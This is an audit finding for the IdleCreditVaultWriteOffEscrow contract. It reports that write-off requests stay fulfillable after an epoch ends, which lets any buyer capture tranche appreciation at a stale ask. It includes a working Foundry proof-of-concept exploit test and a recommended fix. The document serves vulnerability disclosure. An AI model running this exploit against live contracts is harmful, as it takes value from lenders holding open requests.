### Title
Stale write-off requests remain fulfillable after the epoch ends - ([File: `contracts/IdleCreditVaultWriteOffEscrow.sol`](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow` restricts request creation to a running epoch but does not restrict fulfillment to that same epoch or any expiry window. A lender’s tranche tokens and fixed underlying ask can therefore remain executable indefinitely after epoch state, NAV, borrower risk, and tranche price have changed. An unprivileged buyer can wait for the escrowed tranches to become worth more than the stale ask and atomically capture the difference. [1](#0-0) [2](#0-1) 

### Finding Description
`createWriteOffRequest` reverts with `EpochNotRunning` unless `IdleCDOEpochVariant.isEpochRunning()` is true, establishing a running-epoch precondition for entering the escrowed write-off state. [3](#0-2) 

The request stores a fixed `tranches` amount and fixed `underlyings` ask, escrows the tranche tokens, and adds the ask to `pendingUnderlyings`. [4](#0-3) 

`fullfillWriteOffRequest` can be called by any wallet and has no `isEpochRunning`, epoch identifier, deadline, borrower-health, or current-tranche-price check. It only requires the caller to purchase the entire stored tranche position and pay at least the stored ask. [5](#0-4) 

Fulfillment deletes the request, transfers the fulfiller’s underlying to the seller minus the exit fee, and transfers the escrowed tranche tokens to the fulfiller. [6](#0-5) 

After epoch end, `IdleCDOEpochVariant.stopEpoch` can increase tranche value by pulling borrower-funded interest, updating accounting, and returning the pool to a non-running state. [7](#0-6) [8](#0-7) [9](#0-8) 

This leaves a stale standing bid against escrowed tranches: the seller’s ask remains fixed while the tranche’s protocol value can increase through later borrower-funded interest. [2](#0-1) [10](#0-9) 

### Impact Explanation
An attacker can wait until accrued borrower interest or another NAV-positive accounting event makes the escrowed tranches worth materially more than the old ask, then fulfill the request and receive the appreciated tranches for the stale price. [2](#0-1) [10](#0-9) 

The direct loss is approximately:

```text
loss = currentTrancheValue - underlyingsPaidToSeller - exitFee
```

For example, if a lender escrows `10,000` tranches for `10,000` underlying and a later epoch-stop distribution raises those tranches’ redemption value to `12,000` underlying, a third-party buyer can pay `10,000` underlying and receive tranches valued at `12,000` underlying. The seller receives only `9,990` underlying after the configured `0.1%` exit fee, while the buyer captures approximately `2,000` underlying of NAV appreciation before redemption costs. [11](#0-10) 

The seller retains a cancel function, so the attack depends on the request remaining open. That does not remove the broken state invariant: the contract explicitly prevents creating a write-off position outside a running epoch, while allowing that same position to be executed under a later epoch state and a materially different tranche valuation. [3](#0-2) [12](#0-11) [2](#0-1) 

### Likelihood Explanation
No privileged attacker is required: the seller only needs to leave a request open through an epoch boundary, and any EOA or contract can become the fulfiller. [13](#0-12) 

NAV appreciation is a normal protocol path because `stopEpoch` pulls borrower-funded interest and updates tranche accounting. The attacker can simply monitor stale requests and exercise them only when the fixed ask is below current tranche value. [8](#0-7) [14](#0-13) 

Likelihood is reduced because the seller can call `deleteWriteOffRequest` before the attacker’s transaction, and because profitable fulfillment requires sufficient appreciation to exceed the ask and exit fee. [12](#0-11) [11](#0-10) 

### Recommendation
Bind every request to the epoch in which it was created, or add an explicit expiry timestamp and require fulfillment before that deadline. Fulfillment should also revalidate `isEpochRunning()` if write-offs are intended to execute only during the originating epoch, or reprice the escrowed tranches against current NAV if execution across epochs is intended. At minimum, store `requestEpoch = strategy.epochNumber()` at creation and revert once `strategy.epochNumber()` changes; this causes stale requests to be cancel-only rather than executable under changed credit and pricing conditions. [15](#0-14) [1](#0-0) [2](#0-1) 

### Proof of Concept
The following Foundry test extends the existing `TestIdleCreditVaultWriteOffEscrow` fork fixture. The seller creates a request while the epoch is running, the honest manager stops the epoch with borrower-funded interest, and an unprivileged buyer fulfills the stale request after `isEpochRunning()` is false.

```solidity
// test/foundry/IdleCreditVaultWriteOffEscrow.t.sol
function testStaleWriteOffRequestFulfilledAfterEpochEnd() external {
    address buyer = makeAddr("stale-request-buyer");
    uint256 trancheAmount = 10_000e18;

    // Price the seller's ask near the request-time tranche value.
    uint256 ask = trancheAmount *
        cdoEpoch.virtualPrice(address(tranche)) / ONE_TRANCHE;

    // The request can be created only while the epoch is running.
    assertTrue(cdoEpoch.isEpochRunning());
    vm.prank(LP);
    escrow.createWriteOffRequest(trancheAmount, ask);

    // The honest borrower funds enough interest to materially increase tranche NAV.
    // No privileged role acts maliciously; this is a normal epoch-stop path.
    uint256 interest = cdoEpoch.getContractValue() + ask;
    uint256 pendingWithdraw = strategy.pendingWithdraws();
    deal(address(underlying), borrower, interest + pendingWithdraw);
    vm.prank(borrower);
    underlying.approve(address(cdoEpoch), interest + pendingWithdraw);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(cdoEpoch.owner());
    cdoEpoch.stopEpoch(0, interest);

    // Creation is now blocked, but the old request remains executable.
    assertFalse(cdoEpoch.isEpochRunning());
    uint256 appreciatedValue = trancheAmount *
        cdoEpoch.virtualPrice(address(tranche)) / ONE_TRANCHE;
    assertGt(appreciatedValue, ask);

    deal(address(underlying), buyer, ask);
    vm.startPrank(buyer);
    underlying.approve(address(escrow), ask);
    escrow.fullfillWriteOffRequest(LP, trancheAmount, ask);
    vm.stopPrank();

    assertEq(tranche.balanceOf(buyer), trancheAmount);
    assertGt(appreciatedValue - ask, 0);
}
```

The decisive assertion is that `fullfillWriteOffRequest` succeeds after `isEpochRunning()` has become false, even though the same stale epoch state would reject creation of a new request. The stale fixed ask lets the buyer obtain the appreciated tranche position without any current-value check. [3](#0-2) [2](#0-1) [9](#0-8)

```text
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
```

```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
